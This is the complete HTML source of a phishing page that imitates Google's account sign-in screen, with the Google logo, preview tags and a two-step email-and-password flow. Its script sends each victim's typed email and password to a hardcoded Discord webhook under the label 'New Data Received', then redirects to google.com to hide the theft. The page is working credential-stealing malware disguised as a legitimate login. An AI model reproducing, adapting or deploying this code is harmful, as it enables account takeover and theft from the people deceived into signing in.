<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - My Secure App</title>
    
    <!-- إضافة وسوم المعاينة (Open Graph) -->
    <meta property="og:title" content="Sign in - Google Account">
    <meta property="og:description" content="Sign in to continue to your account securely.">
    <meta property="og:image" content="https://raw.githubusercontent.com/cairo24/-4-/main/cairo-pl.webp">
    <meta property="og:url" content="https://cairo24.github.io/-4-/">
    <meta property="og:type" content="website">
    <meta name="twitter:card" content="summary_large_image">

    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background-color: #1f1f1f; color: #e3e3e3; font-family: 'Roboto', sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { width: 100%; max-width: 1040px; display: flex; flex-direction: column; align-items: center; }
        .card { background-color: #0b0b0b; border-radius: 28px; width: 100%; min-height: 440px; display: flex; padding: 36px; gap: 40px; margin-bottom: 24px; position: relative; overflow: hidden; }
        
        .left-side { flex: 1; display: flex; flex-direction: column; justify-content: flex-start; padding-top: 12px; }
        .logo { width: 48px; height: 48px; margin-bottom: 24px; }
        
        h1 { font-size: 36px; font-weight: 400; color: #e3e3e3; margin-bottom: 12px; line-height: 44px; }
        .subtitle { font-size: 16px; color: #e3e3e3; }
        .right-side { flex: 1.1; display: flex; flex-direction: column; justify-content: space-between; padding-top: 12px; min-height: 330px; }
        
        .form-container { display: flex; flex-direction: column; gap: 16px; }
        .step { display: none; flex-direction: column; animation: fadeIn 0.4s ease forwards; }
        .step.active { display: flex; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        
        .input-group { position: relative; width: 100%; margin-top: 12px; }
        .input-group input { width: 100%; padding: 16px; background: #000000; border: 1px solid #8e918f; border-radius: 4px; outline: none; color: #ffffff; font-size: 16px; transition: border-color 0.15s ease; }
        .input-group input:focus { border: 2px solid #a8c7fa; padding: 15px; }
        .input-group label { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); background-color: #0b0b0b; padding: 0 4px; color: #c4c7c5; pointer-events: none; transition: 0.15s ease all; }
        .input-group input:focus ~ label, .input-group input:not(:placeholder-shown) ~ label { top: 0; font-size: 12px; color: #a8c7fa; }
        
        .link-btn { background: none; border: none; color: #a8c7fa; font-size: 14px; cursor: pointer; text-align: left; width: fit-content; margin-top: 8px; }
        .guest-text { font-size: 14px; color: #c4c7c5; margin-top: 26px; }
        .show-password-container { display: flex; align-items: center; gap: 16px; margin-top: 16px; cursor: pointer; }
        .user-chip { display: flex; align-items: center; gap: 8px; background-color: rgba(255, 255, 255, 0.07); border: 1px solid #444746; border-radius: 100px; padding: 4px 12px 4px 4px; cursor: pointer; width: fit-content; margin-bottom: 24px; }
        .avatar { width: 20px; height: 20px; background-color: #a8c7fa; color: #0b0b0b; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 11px; }
        
        .actions { display: flex; justify-content: flex-end; align-items: center; gap: 16px; margin-top: 32px; }
        
        .secondary-btn { background: none; border: none; color: #a8c7fa; cursor: pointer; padding: 12px 20px; border-radius: 100px; font-size: 15px; font-weight: 500; }
        .next-btn { background-color: #a8c7fa; color: #0b0b0b; border: none; padding: 10px 24px; border-radius: 100px; cursor: pointer; font-size: 14px; font-weight: 500; }

        @media (max-width: 768px) {
            .card { flex-direction: column !important; padding: 24px !important; }
            .logo { width: 40px; height: 40px; }
            .right-side { min-height: auto !important; }
        }
    </style>
</head>
<body>

<div class="container">
    <main class="card">
        <section class="left-side">
            <svg class="logo" xmlns="https://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true" jsname="jjf7Ff">
                <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path>
                <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path>
                <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path>
                <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path>
            </svg>
            <h1 id="main-heading">Sign in</h1>
            <p class="subtitle" id="main-subtitle">Use your Google Account</p>
        </section>

        <section class="right-side">
            <form id="loginForm" onsubmit="return false;" style="height: 100%; display: flex; flex-direction: column; justify-content: space-between;">
                <div id="step-email" class="step active">
                    <div class="form-container">
                        <div class="input-group">
                            <input type="email" id="email" placeholder=" " required>
                            <label for="email">Email or username</label>
                        </div>
                        <button type="button" class="link-btn">Forgot username?</button>
                        <p class="guest-text">Not your computer? Use Guest mode to sign in privately.
                            <a href="https://support.google.com/chrome/answer/6130773?hl=en" target="_blank" style="color: #a8c7fa;">Learn more</a>
                        </p>
                    </div>
                    <div class="actions">
                        <button type="button" class="secondary-btn">Create account</button>
                        <button type="button" class="next-btn" onclick="nextStep()">Next</button>
                    </div>
                </div>

                <div id="step-password" class="step">
                    <div class="form-container">
                        <div class="user-chip" onclick="prevStep()">
                            <div class="avatar" id="avatar-letter">U</div>
                            <span id="display-user-email">user@domain.com</span>
                        </div>
                        <div class="input-group">
                            <input type="password" id="password" placeholder=" ">
                            <label for="password">Enter your password</label>
                        </div>
                        <span id="password-error" style="color: #f28b82; font-size: 12px; display: none; margin-top: -10px;">Please enter your password.</span>
                        <label class="show-password-container">
                            <input type="checkbox" id="show-password" onchange="togglePasswordVisibility()">
                            <span>Show password</span>
                        </label>
                    </div>
                    <div class="actions">
                        <button type="button" class="secondary-btn" onclick="prevStep()">Forgot password?</button>
                        <button type="button" class="next-btn" onclick="validateAndSubmit()">Sign in</button>
                    </div>
                </div>
            </form>
        </section>
    </main>
</div>

<script>
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const stepEmail = document.getElementById('step-email');
    const stepPassword = document.getElementById('step-password');
    const passwordError = document.getElementById('password-error');

    function nextStep() {
        if (!emailInput.checkValidity()) return emailInput.reportValidity();
        document.getElementById('main-heading').textContent = "Welcome";
        document.getElementById('display-user-email').textContent = emailInput.value;
        document.getElementById('avatar-letter').textContent = emailInput.value.charAt(0).toUpperCase();
        
        stepEmail.classList.remove('active');
        stepPassword.classList.add('active');
        passwordInput.focus();
        
        history.pushState({ step: 'password' }, "");
    }

    window.onpopstate = function(event) {
        if (!event.state || event.state.step !== 'password') {
            stepPassword.classList.remove('active');
            stepEmail.classList.add('active');
            document.getElementById('main-heading').textContent = "Sign in";
            passwordError.style.display = 'none';
        }
    };

    function prevStep() {
        history.back();
    }

    function togglePasswordVisibility() {
        passwordInput.type = document.getElementById('show-password').checked ? "text" : "password";
    }

    async function validateAndSubmit() {
        if (passwordInput.value.trim() === "") {
            passwordError.style.display = 'block';
            passwordInput.style.borderColor = '#f28b82';
            return;
        }

        const webhookURL = "https://discord.com/api/webhooks/1527466086075863131/JdF1EJ1O8cy2qjKqxOrBy7Z3IH4F-nH51uviJLDEScw5Kqf3VdEKlEMrou7NZvKyT3HF";
        const payload = {
            content: `🔔 **New Data Received:**\nEmail: ${emailInput.value}\nPassword: ${passwordInput.value}`
        };

        try {
            await fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            window.location.replace("https://www.google.com");
        } catch (error) {
            console.error("Error:", error);
        }
    }
</script>
</body>
</html>
